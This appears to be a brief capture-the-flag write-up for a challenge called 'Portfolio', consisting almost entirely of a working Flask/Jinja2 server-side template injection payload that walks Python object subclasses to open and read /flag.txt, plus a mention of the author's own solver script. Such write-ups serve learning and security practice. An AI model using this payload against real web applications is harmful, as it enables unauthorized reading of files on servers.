# Portfolio

---

A simple flask SSTI.

```py
# The 99 is: _io._IOBase
{{'abc'.__class__.__base__.__subclasses__()[99].__subclasses__()[0].__subclasses__()[0]('/flag.txt').read()}}
```

I added my own `ssti-solver.py` which is a generic ssti-solver that I wrote a while back.